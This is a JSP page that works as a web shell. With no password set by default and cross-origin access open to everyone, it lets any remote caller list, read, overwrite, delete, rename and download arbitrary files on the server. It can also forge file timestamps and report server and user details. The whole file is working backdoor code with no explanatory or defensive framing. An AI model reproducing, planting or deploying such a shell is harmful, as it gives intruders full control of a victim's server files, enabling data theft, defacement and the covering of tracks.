<%@ page language="java" contentType="application/json; charset=UTF-8" pageEncoding="UTF-8" %>
<%@ page import="java.io.*,java.util.*" %>
<%!
String esc(String s) {
    if (s == null) return "";
    return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "").replace("\t", "\\t");
}
boolean delTree(File f) {
    if (f.isDirectory()) {
        File[] c = f.listFiles();
        if (c != null) for (int i = 0; i < c.length; i++) delTree(c[i]);
    }
    return f.delete();
}
%><%
response.setHeader("Access-Control-Allow-Origin", "*");
response.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
response.setHeader("Access-Control-Allow-Headers", "Content-Type");

String method = request.getMethod();
if ("OPTIONS".equals(method)) { response.setStatus(200); return; }

String action = request.getParameter("action");
if (action == null || action.length() == 0) { response.setContentType("text/html"); return; }

String PASSWORD = "";
String pw = request.getParameter("password");
if (PASSWORD.length() > 0 && !PASSWORD.equals(pw)) { out.print("null"); return; }

try {
    if ("list".equals(action)) {
        String p = request.getParameter("path");
        if (p == null || p.length() == 0 || "/".equals(p)) p = application.getRealPath("/");
        File d = new File(p);
        if (!d.exists() || !d.isDirectory()) { out.print("{\"success\":false,\"message\":\"Not found\"}"); return; }
        StringBuilder sb = new StringBuilder();
        sb.append("{\"success\":true,\"data\":{\"path\":\"").append(esc(p)).append("\",\"items\":[");
        String pp = d.getParent();
        if (pp != null) sb.append("{\"name\":\"..\",\"path\":\"").append(esc(pp)).append("\",\"is_dir\":true,\"size\":0,\"size_formatted\":\"-\",\"mtime\":0,\"perms\":\"drwxr-xr-x\",\"readable\":true,\"writable\":true}");
        File[] fs = d.listFiles();
        if (fs != null) {
            Arrays.sort(fs);
            for (int i = 0; i < fs.length; i++) {
                File f = fs[i];
                if (sb.charAt(sb.length()-1) != '[') sb.append(",");
                sb.append("{\"name\":\"").append(esc(f.getName())).append("\",\"path\":\"").append(esc(f.getAbsolutePath()));
                sb.append("\",\"is_dir\":").append(f.isDirectory()).append(",\"size\":").append(f.isDirectory()?0:f.length());
                sb.append(",\"size_formatted\":\"").append(f.isDirectory()?"-":f.length()+" B");
                sb.append("\",\"mtime\":").append(f.lastModified()/1000);
                sb.append(",\"perms\":\"").append(f.isDirectory()?"drwxr-xr-x":"-rw-r--r--");
                sb.append("\",\"readable\":").append(f.canRead()).append(",\"writable\":").append(f.canWrite()).append("}");
            }
        }
        sb.append("]},\"message\":\"\"}");
        out.print(sb.toString());
    } else if ("read".equals(action)) {
        String p = request.getParameter("path");
        File f = new File(p);
        if (!f.exists() || !f.isFile()) { out.print("{\"success\":false,\"message\":\"Not found\"}"); return; }
        StringBuilder c = new StringBuilder();
        BufferedReader r = new BufferedReader(new InputStreamReader(new FileInputStream(f), "UTF-8"));
        String line; while ((line = r.readLine()) != null) { if (c.length() > 0) c.append("\n"); c.append(line); }
        r.close();
        out.print("{\"success\":true,\"data\":{\"path\":\"" + esc(p) + "\",\"content\":\"" + esc(c.toString()) + "\"},\"message\":\"\"}");
    } else if ("write".equals(action)) {
        String p = request.getParameter("path");
        String c = request.getParameter("content");
        if (c == null) c = "";
        if (p == null || p.length() == 0) { out.print("{\"success\":false,\"message\":\"Path empty\"}"); return; }
        PrintWriter w = new PrintWriter(new OutputStreamWriter(new FileOutputStream(p), "UTF-8"));
        w.print(c); w.close();
        out.print("{\"success\":true,\"message\":\"Saved\"}");
    } else if ("mkdir".equals(action)) {
        String p = request.getParameter("path");
        if (p == null || p.length() == 0) { out.print("{\"success\":false,\"message\":\"Path empty\"}"); return; }
        File d = new File(p);
        if (d.exists()) { out.print("{\"success\":false,\"message\":\"Exists\"}"); return; }
        out.print(d.mkdirs() ? "{\"success\":true,\"message\":\"Created\"}" : "{\"success\":false,\"message\":\"Failed\"}");
    } else if ("delete".equals(action)) {
        String p = request.getParameter("path");
        File f = new File(p);
        if (!f.exists()) { out.print("{\"success\":false,\"message\":\"Not found\"}"); return; }
        out.print(delTree(f) ? "{\"success\":true,\"message\":\"Deleted\"}" : "{\"success\":false,\"message\":\"Failed\"}");
    } else if ("rename".equals(action)) {
        String op = request.getParameter("old_path");
        String np = request.getParameter("new_path");
        File of = new File(op);
        if (!of.exists()) { out.print("{\"success\":false,\"message\":\"Not found\"}"); return; }
        out.print(of.renameTo(new File(np)) ? "{\"success\":true,\"message\":\"Renamed\"}" : "{\"success\":false,\"message\":\"Failed\"}");
    } else if ("download".equals(action)) {
        String p = request.getParameter("path");
        File f = new File(p);
        if (!f.exists() || !f.isFile()) { out.print("{\"success\":false,\"message\":\"Not found\"}"); return; }
        response.setContentType("application/octet-stream");
        response.setHeader("Content-Disposition", "attachment;filename=\"" + f.getName() + "\"");
        response.setContentLength((int)f.length());
        FileInputStream fis = new FileInputStream(f);
        OutputStream os = response.getOutputStream();
        byte[] buf = new byte[4096]; int len;
        while ((len = fis.read(buf)) != -1) os.write(buf, 0, len);
        fis.close(); os.flush(); return;
    } else if ("touch".equals(action)) {
        String p = request.getParameter("path");
        String t = request.getParameter("time");
        File f = new File(p);
        if (!f.exists()) { out.print("{\"success\":false,\"message\":\"Not found\"}"); return; }
        out.print(f.setLastModified(Long.parseLong(t)*1000) ? "{\"success\":true,\"message\":\"Updated\"}" : "{\"success\":false,\"message\":\"Failed\"}");
    } else if ("server".equals(action)) {
        String dr = application.getRealPath("/");
        File rf = new File(dr);
        out.print("{\"success\":true,\"data\":{\"php_version\":\"Java " + esc(System.getProperty("java.version")) + "\",\"server_software\":\"" + esc(application.getServerInfo()) + "\",\"document_root\":\"" + esc(dr) + "\",\"disk_free\":\"" + rf.getFreeSpace() + "\",\"disk_total\":\"" + rf.getTotalSpace() + "\",\"current_user\":\"" + esc(System.getProperty("user.name")) + "\"},\"message\":\"\"}");
    } else if ("info".equals(action)) {
        String p = request.getParameter("path");
        File f = new File(p);
        if (!f.exists()) { out.print("{\"success\":false,\"message\":\"Not found\"}"); return; }
        long mt = f.lastModified()/1000;
        out.print("{\"success\":true,\"data\":{\"path\":\"" + esc(p) + "\",\"name\":\"" + esc(f.getName()) + "\",\"is_dir\":" + f.isDirectory() + ",\"size\":" + (f.isFile()?f.length():0) + ",\"mtime\":" + mt + ",\"ctime\":" + mt + ",\"atime\":" + mt + "},\"message\":\"\"}");
    } else {
        out.print("{\"success\":false,\"message\":\"Unknown action\"}");
    }
} catch (Exception e) {
    out.print("{\"success\":false,\"message\":\"" + esc(e.toString()) + "\"}");
}
%>
